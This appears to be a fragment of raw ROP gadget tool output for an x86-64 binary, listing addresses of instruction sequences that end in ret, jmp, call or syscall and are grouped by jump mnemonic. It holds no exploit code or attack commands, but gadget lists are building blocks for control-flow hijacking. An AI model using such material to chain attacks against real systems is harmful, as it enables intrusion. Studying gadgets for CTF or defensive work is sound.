0x000000000044776a : jl 0x4477b9 ; adc dword ptr [rsi + 7], edx ; ret
0x0000000000448120 : jl 0x44813f ; cld ; vzeroupper ; ret
0x000000000044b132 : jl 0x44b160 ; or byte ptr [rax - 0x75], cl ; and al, 0x10 ; call rax
0x0000000000451671 : jl 0x45169f ; and byte ptr [rax - 0x75], cl ; and al, 0x10 ; call rax
0x0000000000451a96 : jl 0x451ac4 ; cmp byte ptr [rax - 0x75], cl ; and al, 0x18 ; call rax
0x00000000004539d8 : jl 0x453a06 ; mov rax, qword ptr [rsp + 0x20] ; call rax
0x0000000000453fbb : jl 0x453fe5 ; call r15
0x0000000000454a0a : jl 0x454a38 ; cmp byte ptr [rax - 0x75], cl ; and al, 0x18 ; call rax
0x000000000045632c : jl 0x456356 ; call r15
0x0000000000456767 : jl 0x456790 ; call rbx
0x000000000045681d : jl 0x45684a ; add byte ptr [rsi + rsi*2 - 0xa], sil ; ret
0x0000000000456f4d : jl 0x456f77 ; or al, 0xe9 ; ret
0x000000000045756c : jl 0x457596 ; call r15
0x00000000004579a7 : jl 0x4579d0 ; call rbx
0x0000000000457a5d : jl 0x457a8a ; add byte ptr [rdx + rdi*2 - 0xa], sil ; ret
0x000000000045ba47 : jl 0x45ba72 ; and byte ptr [rax + 1], cl ; ret
0x000000000045bebe : jl 0x45bee9 ; or byte ptr [rax - 0x7d], cl ; call qword ptr [rbx]
0x000000000045c206 : jl 0x45c231 ; xor byte ptr [rax + 0x39], cl ; ret 0x8d48
0x00000000004673fb : jl 0x467428 ; add byte ptr [rcx + 0xf], al ; xchg eax, esp ; ret
0x0000000000468ae5 : jl 0x468b10 ; adc byte ptr [rax - 0x7d], cl ; ret
0x000000000047581f : jl 0x47584d ; sbb byte ptr [rax + 0x101], bh ; syscall
0x00000000004785f6 : jl 0x478620 ; sbb al, ch ; ret 0xf87e
0x000000000047b6f5 : jl 0x47b720 ; or byte ptr [rax - 0x7d], cl ; ret 0x101
0x0000000000482705 : jl 0x482733 ; sbb byte ptr [rax - 0x75], cl ; push rsp ; and al, 0x10 ; call rdx
0x00000000004876f3 : jl 0x4876bf ; or byte ptr [rax - 0x77], cl ; add ebp, eax ; ret 0xf992
0x00000000004a8ad2 : jl 0x4a8b31 ; leave ; retf
0x00000000004ad4d8 : jl 0x4ad4fd ; add byte ptr [rax], al ; xor al, 0x93 ; idiv bh ; retf
0x00000000004b0fd8 : jl 0x4b1037 ; add byte ptr [rax], al ; add al, 9 ; cli ; jmp qword ptr [rdx]
0x00000000004b1e54 : jl 0x4b1e37 ; cli ; call qword ptr [rsi]
0x00000000004b4214 : jl 0x4b41e2 ; cld ; call rdx
0x00000000004412ce : jle 0x4412d7 ; add byte ptr [rax], al ; bsf rax, rdx ; ret
0x00000000004412ce : jle 0x4412d8 ; add byte ptr [rax], al ; bsf rax, rdx ; ret
0x0000000000447441 : jle 0x44747d ; movsxd rax, ecx ; ret
0x0000000000459062 : jle 0x459075 ; sub eax, 1 ; mov dword ptr [rbx + 8], eax ; pop rbx ; ret
0x000000000046c79e : jle 0x46c752 ; and al, 0 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x00000000004a6f82 : jle 0x4a6f1b ; xlatb ; retf 0xa1eb
0x00000000004a8b45 : jle 0x4a8b80 ; pop rsp ; sbb ebp, ebx ; retf
0x00000000004251cd : jmp 0x100c7b19
0x0000000000425276 : jmp 0x100c7bc2
0x00000000004253b6 : jmp 0x100c7d02
0x00000000004254f6 : jmp 0x100c7e42
0x0000000000425636 : jmp 0x100c7f82
0x0000000000425776 : jmp 0x100c80c2
0x00000000004258b6 : jmp 0x100c8202
0x00000000004259f6 : jmp 0x100c8342
0x0000000000425b36 : jmp 0x100c8482
0x0000000000425c76 : jmp 0x100c85c2
0x0000000000425db6 : jmp 0x100c8702
0x0000000000425ef6 : jmp 0x100c8842
0x0000000000426036 : jmp 0x100c8982
0x0000000000426176 : jmp 0x100c8ac2
0x00000000004262b6 : jmp 0x100c8c02
0x00000000004263f6 : jmp 0x100c8d42
0x00000000004268bd : jmp 0x100c9209
0x0000000000426966 : jmp 0x100c92b2
0x0000000000426a86 : jmp 0x100c93d2
0x0000000000426ba6 : jmp 0x100c94f2
0x0000000000426cc6 : jmp 0x100c9612
0x0000000000426de6 : jmp 0x100c9732
0x0000000000426f06 : jmp 0x100c9852
0x0000000000427026 : jmp 0x100c9972
0x0000000000427146 : jmp 0x100c9a92
0x0000000000427266 : jmp 0x100c9bb2
0x0000000000427386 : jmp 0x100c9cd2
0x00000000004274a6 : jmp 0x100c9df2
0x00000000004275c6 : jmp 0x100c9f12
0x00000000004276e6 : jmp 0x100ca032
0x0000000000427806 : jmp 0x100ca152
0x0000000000427926 : jmp 0x100ca272
0x0000000000427b3d : jmp 0x100ca489
0x0000000000427c16 : jmp 0x100ca562
0x0000000000427d96 : jmp 0x100ca6e2
0x0000000000427f16 : jmp 0x100ca862
0x0000000000428096 : jmp 0x100ca9e2
0x0000000000428216 : jmp 0x100cab62
0x0000000000428396 : jmp 0x100cace2
0x0000000000428516 : jmp 0x100cae62
0x0000000000428696 : jmp 0x100cafe2
0x0000000000428816 : jmp 0x100cb162
0x0000000000428996 : jmp 0x100cb2e2
0x0000000000428b16 : jmp 0x100cb462
0x0000000000428c96 : jmp 0x100cb5e2
0x0000000000428e16 : jmp 0x100cb762
0x0000000000428f96 : jmp 0x100cb8e2
0x0000000000429116 : jmp 0x100cba62
0x000000000042938d : jmp 0x100cbcd9
0x0000000000429466 : jmp 0x100cbdb2
0x00000000004295d6 : jmp 0x100cbf22
0x0000000000429746 : jmp 0x100cc092
0x00000000004298b6 : jmp 0x100cc202
0x0000000000429a26 : jmp 0x100cc372
0x0000000000429b96 : jmp 0x100cc4e2
0x0000000000429d06 : jmp 0x100cc652
0x0000000000429e76 : jmp 0x100cc7c2
0x0000000000429fe6 : jmp 0x100cc932
0x000000000042a156 : jmp 0x100ccaa2
0x000000000042a2c6 : jmp 0x100ccc12
0x000000000042a436 : jmp 0x100ccd82
0x000000000042a5a6 : jmp 0x100ccef2
0x000000000042a716 : jmp 0x100cd062
0x000000000042a886 : jmp 0x100cd1d2
0x000000000042aaf9 : jmp 0x100cd445
0x000000000042aba6 : jmp 0x100cd4f2
0x000000000042ac96 : jmp 0x100cd5e2
0x000000000042ad86 : jmp 0x100cd6d2
0x000000000042ae76 : jmp 0x100cd7c2
0x000000000042af66 : jmp 0x100cd8b2
0x000000000042b056 : jmp 0x100cd9a2
0x000000000042b146 : jmp 0x100cda92
0x000000000042b236 : jmp 0x100cdb82
0x000000000042b326 : jmp 0x100cdc72
0x000000000042b416 : jmp 0x100cdd62
0x000000000042b506 : jmp 0x100cde52
0x000000000042b5f6 : jmp 0x100cdf42
0x000000000042b6e6 : jmp 0x100ce032
0x000000000042b7d6 : jmp 0x100ce122
0x000000000042b8c6 : jmp 0x100ce212
0x00000000004395d7 : jmp 0x100dbf23
0x000000000043975c : jmp 0x100dc0a8
0x000000000043996c : jmp 0x100dc2b8
0x0000000000439b7c : jmp 0x100dc4c8
0x0000000000439d8c : jmp 0x100dc6d8
0x0000000000439f9c : jmp 0x100dc8e8
0x000000000043a1ac : jmp 0x100dcaf8
0x000000000043a3bc : jmp 0x100dcd08
0x000000000043a5cc : jmp 0x100dcf18
0x000000000043a7dc : jmp 0x100dd128
0x000000000043a9ec : jmp 0x100dd338
0x000000000043abfc : jmp 0x100dd548
0x000000000043ae0c : jmp 0x100dd758
0x000000000043b01c : jmp 0x100dd968
0x000000000043b22c : jmp 0x100ddb78
0x000000000043b43c : jmp 0x100ddd88
0x000000000043b817 : jmp 0x100de163
0x000000000043b99c : jmp 0x100de2e8
0x000000000043bb9c : jmp 0x100de4e8
0x000000000043bd9c : jmp 0x100de6e8
0x000000000043bf9c : jmp 0x100de8e8
0x000000000043c19c : jmp 0x100deae8
0x000000000043c39c : jmp 0x100dece8
0x000000000043c59c : jmp 0x100deee8
0x000000000043c79c : jmp 0x100df0e8
0x000000000043c99c : jmp 0x100df2e8
0x000000000043cb9c : jmp 0x100df4e8
0x000000000043cd9c : jmp 0x100df6e8
0x000000000043cf9c : jmp 0x100df8e8
0x000000000043d19c : jmp 0x100dfae8
0x000000000043d39c : jmp 0x100dfce8
0x000000000043d59c : jmp 0x100dfee8
0x000000000043d95f : jmp 0x100e02ab
0x000000000043dac8 : jmp 0x100e0414
0x000000000043dc68 : jmp 0x100e05b4
0x000000000043de08 : jmp 0x100e0754
0x000000000043dfa8 : jmp 0x100e08f4
0x000000000043e148 : jmp 0x100e0a94
0x000000000043e2e8 : jmp 0x100e0c34
0x000000000043e488 : jmp 0x100e0dd4
0x000000000043e628 : jmp 0x100e0f74
0x000000000043e7c8 : jmp 0x100e1114
0x000000000043e968 : jmp 0x100e12b4
0x000000000043eb08 : jmp 0x100e1454
0x000000000043eca8 : jmp 0x100e15f4
0x000000000043ee48 : jmp 0x100e1794
0x000000000043efe8 : jmp 0x100e1934
0x000000000043f188 : jmp 0x100e1ad4
0x000000000043f4d5 : jmp 0x100e1e21
0x000000000043f5de : jmp 0x100e1f2a
0x000000000043f72e : jmp 0x100e207a
0x000000000043f87e : jmp 0x100e21ca
0x000000000043f9ce : jmp 0x100e231a
0x000000000043fb1e : jmp 0x100e246a
0x000000000043fc6e : jmp 0x100e25ba
0x000000000043fdbe : jmp 0x100e270a
0x000000000043ff0e : jmp 0x100e285a
0x000000000044005e : jmp 0x100e29aa
0x00000000004401ae : jmp 0x100e2afa
0x00000000004402fe : jmp 0x100e2c4a
0x000000000044044e : jmp 0x100e2d9a
0x000000000044059e : jmp 0x100e2eea
0x00000000004406ee : jmp 0x100e303a
0x000000000044083e : jmp 0x100e318a
0x000000000042416e : jmp 0x40043a
0x00000000004851e5 : jmp 0x401c32
0x0000000000404a33 : jmp 0x4044aa
0x00000000004057cb : jmp 0x405798
0x000000000040f511 : jmp 0x40f4d6
0x000000000040f5ae : jmp 0x40f572
0x000000000040fc49 : jmp 0x40fc0e
0x00000000004138c1 : jmp 0x4138c0
0x0000000000415002 : jmp 0x414fc8
0x000000000041c867 : jmp 0x41c5e2
0x000000000041d479 : jmp 0x41d485
0x000000000041de27 : jmp 0x41d6d7
0x0000000000424055 : jmp 0x424023
0x000000000042ac12 : jmp 0x42ac28
0x000000000042cfc8 : jmp 0x42cf96
0x000000000042d046 : jmp 0x42d014
0x000000000042d4d8 : jmp 0x42d4a6
0x000000000042d556 : jmp 0x42d524
0x0000000000440aa4 : jmp 0x440a6a
0x0000000000440bf8 : jmp 0x440bbd
0x0000000000440cbc : jmp 0x440c82
0x0000000000440e08 : jmp 0x440dcd
0x000000000044712e : jmp 0x4470f4
0x00000000004471ff : jmp 0x4471c5
0x000000000044726e : jmp 0x447234
0x0000000000448db8 : jmp 0x448d86
0x0000000000449d03 : jmp 0x449b91
0x000000000044a081 : jmp 0x449fde
0x000000000044a411 : jmp 0x44a371
0x000000000044a4b5 : jmp 0x44a47a
0x000000000044a55b : jmp 0x44a520
0x000000000044e613 : jmp 0x44de28
0x0000000000459dc4 : jmp 0x459bb8
0x000000000044ea72 : jmp 0x45b4e2
0x000000000045fc5e : jmp 0x45deb4
0x000000000045f4f3 : jmp 0x45f4f8
0x0000000000463007 : jmp 0x462fcc
0x000000000046a928 : jmp 0x46a8ee
0x000000000046b463 : jmp 0x46b431
0x000000000046f254 : jmp 0x46f219
0x000000000046f253 : jmp 0x46f21a
0x000000000046f985 : jmp 0x46f953
0x000000000046ff4b : jmp 0x46ff10
0x00000000004720e6 : jmp 0x4720af
0x0000000000472603 : jmp 0x4725c9
0x00000000004728dc : jmp 0x47283b
0x00000000004743e4 : jmp 0x4741d2
0x0000000000475861 : jmp 0x4757b3
0x0000000000477f99 : jmp 0x477f9f
0x000000000047a302 : jmp 0x47a2c7
0x000000000047e538 : jmp 0x47e505
0x0000000000486045 : jmp 0x47e548
0x0000000000484512 : jmp 0x484564
0x0000000000485c8a : jmp 0x485c50
0x0000000000488312 : jmp 0x488364
0x000000000048ea2e : jmp 0x48ea44
0x000000000048f7a1 : jmp 0x48f76f
0x0000000000492266 : jmp 0x49211b
0x00000000004a718a : jmp 0x4a71c9
0x00000000004a7ec9 : jmp 0x4a7e9c
0x00000000004a8b49 : jmp 0x4a8b17
0x00000000004a8ec0 : jmp 0x4a8e54
0x00000000004a8ebf : jmp 0x4a8e55
0x00000000004a9096 : jmp 0x4a9064
0x00000000004ab894 : jmp 0x4ab8ac
0x00000000004357aa : jmp 0x4fc267a8
0x00000000004357a9 : jmp 0x4fc267a9
0x00000000004382ca : jmp 0x4fc292c8
0x00000000004382c9 : jmp 0x4fc292c9
0x00000000004a7137 : jmp 0xffffffff91148b0e
0x0000000000482fa1 : jmp 0xffffffffc357b8f6
0x000000000049285c : jmp 0xffffffffe1491f5c
0x000000000047bae9 : jmp 0xffffffffeb097d79
0x00000000004755e3 : jmp 0xfffffffff6791873
0x00000000004123f2 : jmp 0xfffffffffef5a80f
0x0000000000494c2f : jmp qword ptr [rax + 0x10fffa0a]
0x0000000000494c47 : jmp qword ptr [rax + 0x10fffa0f]
0x0000000000495137 : jmp qword ptr [rax + 0x10fffa2f]
0x0000000000494c83 : jmp qword ptr [rax + 0x20fff9ec]
0x0000000000494cc7 : jmp qword ptr [rax + 0x20fff9ee]
0x0000000000494c8b : jmp qword ptr [rax + 0x20fff9ef]
0x0000000000494ccf : jmp qword ptr [rax + 0x20fff9f1]
0x0000000000494c93 : jmp qword ptr [rax + 0x20fff9f2]
0x0000000000494cd7 : jmp qword ptr [rax + 0x20fff9f4]
0x0000000000494c9b : jmp qword ptr [rax + 0x20fff9f5]
0x0000000000494cdf : jmp qword ptr [rax + 0x20fff9f7]
0x0000000000494ca3 : jmp qword ptr [rax + 0x20fff9f8]
0x0000000000494ce7 : jmp qword ptr [rax + 0x20fff9fa]
0x0000000000494cab : jmp qword ptr [rax + 0x20fff9fb]
0x0000000000494cef : jmp qword ptr [rax + 0x20fff9fd]
0x0000000000494cb3 : jmp qword ptr [rax + 0x20fff9fe]
0x0000000000494cf7 : jmp qword ptr [rax + 0x20fffa00]
0x0000000000494c27 : jmp qword ptr [rax + 0x20fffa0b]
0x0000000000494c1f : jmp qword ptr [rax + 0x20fffa0c]
0x0000000000494c17 : jmp qword ptr [rax + 0x20fffa0d]
0x0000000000494c0f : jmp qword ptr [rax + 0x20fffa0e]
0x0000000000494f6b : jmp qword ptr [rax + 0x20fffa31]
0x0000000000494f63 : jmp qword ptr [rax + 0x20fffa32]
0x0000000000494f5b : jmp qword ptr [rax + 0x20fffa33]
0x0000000000494f53 : jmp qword ptr [rax + 0x20fffa34]
0x0000000000494f4b : jmp qword ptr [rax + 0x20fffa35]
0x00000000004952bb : jmp qword ptr [rax + 0x40fffa8c]
0x0000000000494cbb : jmp qword ptr [rax - 0x1f0005ff]
0x000000000049434b : jmp qword ptr [rax - 0x2e00066a]
0x000000000049459b : jmp qword ptr [rax - 0x3d]
0x000000000049542f : jmp qword ptr [rax - 0x3f000501]
0x000000000049540f : jmp qword ptr [rax - 0x3f000502]
0x0000000000494253 : jmp qword ptr [rax - 0x3f0006d4]
0x000000000040e421 : jmp qword ptr [rax]
0x000000000047a27d : jmp qword ptr [rbx]
0x00000000004928e3 : jmp qword ptr [rcx]
0x00000000004a9784 : jmp qword ptr [rdi]
0x0000000000494dc3 : jmp qword ptr [rdx + 0x32fffa3f]
0x0000000000469805 : jmp qword ptr [rdx + rax*8]
0x0000000000494367 : jmp qword ptr [rdx]
0x0000000000448c59 : jmp qword ptr [rsi + 0xf]
0x000000000044c877 : jmp qword ptr [rsi]
0x00000000004251a9 : jmp r10
0x00000000004801b0 : jmp r11
0x000000000042e1ad : jmp r9
0x00000000004952c3 : jmp rax
0x00000000004801b1 : jmp rbx
0x0000000000422d12 : jmp rcx
0x000000000040d63e : jmp rdi
0x000000000040d355 : jmp rdx
0x000000000045a767 : jmp rsi
0x00000000004949a3 : jmp rsp
0x000000000040058d : jne 0x400594 ; ret
0x0000000000405eac : jne 0x405ec0 ; pop rbx ; xor eax, eax ; pop rbp ; pop r12 ; ret
0x000000000040dbd8 : jne 0x40dbb6 ; ret
0x000000000040dccb : jne 0x40dcf5 ; add rsp, 0x118 ; ret
0x0000000000410061 : jne 0x410074 ; add rsp, 0xd8 ; ret
0x0000000000410112 : jne 0x410125 ; add rsp, 0xd8 ; ret
0x00000000004150d5 : jne 0x4150e3 ; ret
0x0000000000416cf8 : jne 0x416d4c ; add rsp, 0x38 ; pop rbx ; pop rbp ; ret
0x0000000000416d71 : jne 0x416d63 ; ret
0x0000000000417c8e : jne 0x417c83 ; ret
0x00000000004182c1 : jne 0x418287 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000041830c : jne 0x418305 ; lea eax, [rdx + rdi] ; ret
0x0000000000418c26 : jne 0x418c1b ; ret
0x000000000041a880 : jne 0x41a88f ; add rsp, 0x20 ; pop rbx ; ret
0x000000000041ff5c : jne 0x41ff23 ; ret
0x000000000042340a : jne 0x423391 ; ret
0x0000000000423717 : jne 0x423706 ; sub rax, 0x10 ; ret
0x00000000004267fc : jne 0x4267e6 ; xor eax, eax ; sub eax, ecx ; ret
0x000000000042bc97 : jne 0x42bcf4 ; xor eax, eax ; ret
0x000000000042bc67 : jne 0x42bd18 ; xor eax, eax ; ret
0x000000000042c113 : jne 0x42c137 ; xor eax, eax ; vzeroupper ; ret
0x000000000042c84a : jne 0x42c855 ; vzeroupper ; ret
0x000000000042c944 : jne 0x42c856 ; ret
0x000000000042ca8f : jne 0x42c859 ; vzeroupper ; ret
0x000000000042e0fd : jne 0x42e127 ; xor eax, eax ; ret
0x000000000042d6f1 : jne 0x42e12b ; xor eax, eax ; ret
0x000000000042d719 : jne 0x42e137 ; xor eax, eax ; ret
0x00000000004454d5 : jne 0x445466 ; lea rax, [rdi + 3] ; ret
0x00000000004454a7 : jne 0x445466 ; lea rax, [rdi + 7] ; ret
0x00000000004454a6 : jne 0x445467 ; lea rax, [rdi + 7] ; ret
0x0000000000446c34 : jne 0x446e48 ; xor eax, eax ; ret
0x0000000000446e39 : jne 0x446e59 ; xor eax, eax ; ret
0x0000000000446ce1 : jne 0x446e5d ; xor eax, eax ; ret
0x0000000000446e51 : jne 0x446e5e ; cmp eax, ecx ; sbb eax, eax ; sbb eax, -1 ; ret
0x0000000000446f61 : jne 0x446f52 ; ret
0x0000000000447011 : jne 0x447002 ; ret
0x0000000000447181 : jne 0x447176 ; lea rax, [rcx - 1] ; ret
0x00000000004472d1 : jne 0x4472c6 ; sub rax, 1 ; ret
0x00000000004485dd : jne 0x4485c6 ; ret
0x0000000000448744 : jne 0x44872c ; vzeroupper ; ret
0x0000000000448907 : jne 0x4488e7 ; vzeroupper ; ret
0x0000000000448db2 : jne 0x448ce7 ; jmp 0x448d8c
0x00000000004490df : jne 0x44910b ; add rsp, 0x20 ; pop rbx ; ret
0x0000000000449ec7 : jne 0x449edf ; add rsp, 0x28 ; ret
0x000000000044a0f7 : jne 0x44a141 ; add rsp, 0x58 ; ret
0x000000000044a148 : jne 0x44a164 ; xor eax, eax ; syscall
0x000000000044a218 : jne 0x44a237 ; mov eax, 1 ; syscall
0x000000000044a355 : jne 0x44a3bf ; mov eax, 0x48 ; syscall
0x000000000044a4b1 : jne 0x44a47e ; neg eax ; jmp 0x44a47e
0x000000000044a487 : jne 0x44a4d9 ; add rsp, 0x68 ; ret
0x000000000044a4e8 : jne 0x44a507 ; mov eax, 3 ; syscall
0x000000000044adf6 : jne 0x44ae0d ; add rsp, 0x28 ; ret
0x000000000044b02b : jne 0x44b046 ; mov rdi, qword ptr [rbx] ; call r12
0x000000000044b051 : jne 0x44b097 ; mov rdi, qword ptr [rbp] ; call r12
0x000000000044b079 : jne 0x44b0b7 ; mov rdi, qword ptr [rbp] ; call r12
0x000000000044bb96 : jne 0x44bbbe ; mov rdi, qword ptr [rbx] ; call r12
0x000000000044bbc9 : jne 0x44bc17 ; mov rdi, qword ptr [rbp] ; call r12
0x000000000044bbf5 : jne 0x44bc77 ; mov rdi, qword ptr [rbp] ; call r12
0x000000000044bc81 : jne 0x44bce8 ; mov rdi, qword ptr [r13] ; call r12
0x000000000044bcb1 : jne 0x44bd19 ; mov rdi, qword ptr [r13] ; call r12
0x000000000044c6b2 : jne 0x44c6a9 ; pop rdx ; pop r10 ; ret
0x000000000044c6a2 : jne 0x44c6b4 ; nop ; mov eax, 0xca ; syscall
0x000000000044f9af : jne 0x44f943 ; call rsi
0x000000000045b56f : jne 0x45b57c ; add rsp, 0x18 ; ret
0x000000000045b7b7 : jne 0x45b80c ; add rsp, 0x148 ; ret
0x00000000004634f7 : jne 0x463503 ; add byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x85 ; retf 6
0x00000000004689e2 : jne 0x4689f5 ; add rsp, 0xd8 ; ret
0x0000000000470af1 : jne 0x470ae3 ; ret
0x0000000000471d3c : jne 0x471d35 ; lea eax, [rdx + rdi] ; ret
0x00000000004720e2 : jne 0x4720ae ; xor eax, eax ; jmp 0x4720b3
0x00000000004737f3 : jne 0x4737fe ; xor rax, rax ; ret
0x0000000000473bf3 : jne 0x473c28 ; mov rax, r8 ; vzeroupper ; ret
0x00000000004744ac : jne 0x4744a3 ; ret
0x00000000004744b3 : jne 0x4744be ; xor rax, rax ; ret
0x000000000047474b : jne 0x474706 ; mov rax, rdx ; ret
0x0000000000475797 : jne 0x4757fd ; mov eax, 0x101 ; syscall
0x00000000004758cc : jne 0x475919 ; add rsp, 0x58 ; ret
0x000000000047594f : jne 0x475962 ; movzx eax, al ; add rsp, 0x58 ; ret
0x00000000004759fe : jne 0x475a21 ; add rsp, 0x38 ; ret
0x000000000047e81a : jne 0x47e7c0 ; mov eax, dword ptr [rdx + 4] ; ret
0x000000000047e808 : jne 0x47e7e3 ; ret
0x000000000047f4a7 : jne 0x47f4c1 ; mov rax, qword ptr [rip + 0x23cf00] ; ret
0x000000000047f4fc : jne 0x47f4d3 ; ret
0x000000000047fda4 : jne 0x47fdd8 ; call qword ptr [rip + 0x23cab4]
0x0000000000480fb9 : jne 0x480f91 ; movsx eax, cl ; neg eax ; ret
0x0000000000481daa : jne 0x481db9 ; add rsp, 0x20 ; pop rbx ; ret
0x0000000000481ea5 : jne 0x481ed9 ; add rsp, 0x38 ; ret
0x0000000000481f65 : jne 0x481f94 ; add rsp, 0x68 ; ret
0x00000000004820c6 : jne 0x482104 ; add rsp, 0x78 ; ret
0x0000000000482395 : jne 0x4823c4 ; add rsp, 0x68 ; ret
0x00000000004843d1 : jne 0x484411 ; leave ; ret
0x0000000000484871 : jne 0x48485d ; mov rax, rsi ; ret
0x00000000004848f5 : jne 0x4848d5 ; mov rax, rsi ; ret
0x000000000048505d : jne 0x48506a ; add rsp, 0x38 ; ret
0x0000000000485140 : jne 0x48515a ; add rsp, 0x38 ; ret
0x0000000000487856 : jne 0x487880 ; ret
0x0000000000487855 : jne 0x487881 ; ret
0x000000000048790b : jne 0x487912 ; pop rbx ; ret
0x000000000048849b : jne 0x4884b2 ; add rsp, 0x38 ; ret
0x00000000004885a9 : jne 0x4885c3 ; add rsp, 0x40 ; pop rbx ; ret
0x0000000000488690 : jne 0x4886ab ; add rsp, 0x50 ; pop rbx ; ret
0x000000000048b079 : jne 0x48b09c ; xor eax, eax ; ret
0x000000000048b061 : jne 0x48b0a1 ; mov rax, qword ptr [rsi + 0xb0] ; ret
0x000000000048d290 : jne 0x48d2b1 ; mov rax, qword ptr [rax] ; ret
0x000000000048d2ff : jne 0x48d30a ; mov qword ptr [rax], rdx ; ret
0x000000000048d65e : jne 0x48d657 ; mov r15, qword ptr [rbp - 8] ; leave ; ret
0x000000000048d928 : jne 0x48d921 ; mov r15, qword ptr [rbp - 8] ; leave ; ret
0x000000000048dc63 : jne 0x48dc5c ; mov r15, qword ptr [rbp - 8] ; leave ; ret
0x000000000048e1b4 : jne 0x48e1d3 ; ret
0x000000000048e1d4 : jne 0x48e1ec ; mov eax, 8 ; ret
0x000000000048e1ff : jne 0x48e22e ; mov rax, qword ptr [rsi + 0x10] ; ret
0x000000000048e219 : jne 0x48e232 ; xor eax, eax ; ret
0x000000000048f05f : jne 0x48f08e ; mov rax, qword ptr [rsi + 0x10] ; ret
0x000000000048f079 : jne 0x48f092 ; xor eax, eax ; ret
0x000000000048f619 : jne 0x48f623 ; ret
0x000000000048f634 : jne 0x48f643 ; ret
0x000000000048f864 : jne 0x48f873 ; ret
0x000000000048fae9 : jne 0x48fb0c ; xor eax, eax ; ret
0x00000000004900b5 : jne 0x4900a8 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000490100 : jne 0x4900e0 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000490245 : jne 0x49022b ; pop rbx ; ret
0x0000000000490353 : jne 0x49033e ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000490f0d : jne 0x490ef6 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000491091 : jne 0x4910a8 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000494339 : jne 0x494336 ; jmp rax
0x0000000000496869 : jne 0x49686c ; dec dword ptr [rsi + rsi*2] ; sti ; jmp qword ptr [rax]
0x00000000004a4fd1 : jne 0x4a4fd2 ; call qword ptr [rax]
0x00000000004a6ff7 : jne 0x4a6fc1 ; mov ecx, 0x5b92ac50 ; retf
0x00000000004a8f8b : jne 0x4a8fb2 ; retf 0x32dd
0x000000000042d9ae : jno 0x42d9bd ; add byte ptr [rax], al ; xor eax, eax ; ret
0x0000000000438da0 : jno 0x438da9 ; vmovups zmmword ptr [r9 - 0x40], zmm7 ; ret
0x0000000000438fda : jno 0x438fe3 ; vmovups zmmword ptr [r9 - 0x40], zmm15 ; ret
0x0000000000439141 : jno 0x439152 ; vmovups zmmword ptr [r9 + 0x1c0], zmm15 ; ret
0x00000000004392a6 : jno 0x43932a ; adc qword ptr [rdi - 8], rdi ; ret
0x0000000000482e94 : jno 0x482ee6 ; shl ecx, cl ; mov qword ptr [rdi], r9 ; ret
0x0000000000484ea4 : jno 0x484ecd ; add cl, ch ; retf
0x0000000000494329 : jno 0x494326 ; jmp rax
0x0000000000494325 : jno 0x494326 ; push rax ; jno 0x49432a ; jmp rax
0x00000000004943b8 : jno 0x494359 ; stc ; call qword ptr [rcx]
0x0000000000496245 : jno 0x496244 ; call qword ptr [rax]
0x0000000000496241 : jno 0x496244 ; push qword ptr [rax] ; jno 0x496248 ; call qword ptr [rax]
0x00000000004250b1 : jnp 0x4250e4 ; add al, byte ptr [rax] ; cmovne rax, rdx ; ret
0x00000000004250b1 : jnp 0x4250e5 ; add al, byte ptr [rax] ; cmovne rax, rdx ; ret
0x00000000004a79a5 : jnp 0x4a7962 ; ret
0x00000000004a89a2 : jnp 0x4a8a00 ; retf
0x00000000004a8da9 : jnp 0x4a8df6 ; retf 0x99e0
0x00000000004a9a09 : jnp 0x4a9a4a ; retf
0x00000000004057c6 : jns 0x405796 ; mov r15, r12 ; jmp 0x40579d
0x0000000000424d4f : jns 0x424d57 ; add byte ptr [rsi + rax*8 - 0xd], dh ; ret
0x0000000000438da7 : jns 0x438daa ; ret
0x0000000000438fe1 : jns 0x438fe4 ; ret
0x0000000000439148 : jns 0x439153 ; ret
0x000000000043f5d7 : jns 0x43f5b2 ; retf 0xead3
0x000000000043f727 : jns 0x43f702 ; retf 0xead3
0x000000000043f877 : jns 0x43f852 ; retf 0xead3
0x000000000043f9c7 : jns 0x43f9a2 ; retf 0xead3
0x000000000043fb17 : jns 0x43faf2 ; retf 0xead3
0x000000000043fc67 : jns 0x43fc42 ; retf 0xead3
0x000000000043fdb7 : jns 0x43fd92 ; retf 0xead3
0x000000000043ff07 : jns 0x43fee2 ; retf 0xead3
0x0000000000440057 : jns 0x440032 ; retf 0xead3
0x00000000004401a7 : jns 0x440182 ; retf 0xead3
0x00000000004402f7 : jns 0x4402d2 ; retf 0xead3
0x0000000000440447 : jns 0x440422 ; retf 0xead3
0x0000000000440597 : jns 0x440572 ; retf 0xead3
0x00000000004406e7 : jns 0x4406c2 ; retf 0xead3
0x0000000000440837 : jns 0x440812 ; retf 0xead3
0x000000000044bbf6 : jns 0x44bc46 ; mov edi, dword ptr [rbp] ; call r12
0x000000000044dcfa : jns 0x44dd02 ; add byte ptr [rcx], bh ; ret
0x000000000044dd19 : jns 0x44dd23 ; add byte ptr [rcx], dh ; sar byte ptr [rcx], cl ; ret
0x000000000048af4e : jns 0x48af5b ; mov r8, qword ptr [r8] ; mov qword ptr [r10], r8 ; ret
0x000000000048d1fe : jns 0x48d241 ; add byte ptr [rbp + rbx + 0x48], dh ; add esp, 0x18 ; ret
0x000000000048df6e : jns 0x48df7b ; mov r8, qword ptr [r8] ; mov qword ptr [r10], r8 ; ret
0x000000000048fb6e : jns 0x48fb7b ; mov r8, qword ptr [r8] ; mov qword ptr [r10], r8 ; ret
0x00000000004967bd : jns 0x4967bc ; jmp rsi
0x00000000004a6aae : jns 0x4a6a44 ; ret 0xf869
0x00000000004a6aad : jns 0x4a6a45 ; ret 0xf869
0x00000000004a8ebe : jns 0x4a8f15 ; jmp 0x4a8e56
0x00000000004b16bd : jns 0x4b16bb ; call qword ptr [rdx]
0x00000000004b173d : jns 0x4b173b ; jmp rax
0x0000000000414ef4 : jo 0x414f45 ; add esp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000414f24 : jo 0x414f75 ; add esp, 8 ; pop rbx ; pop rbp ; ret
0x000000000044ab9d : jo 0x44aba1 ; dec dword ptr [rax - 0x77] ; ret
0x000000000044c942 : jo 0x44c966 ; ret
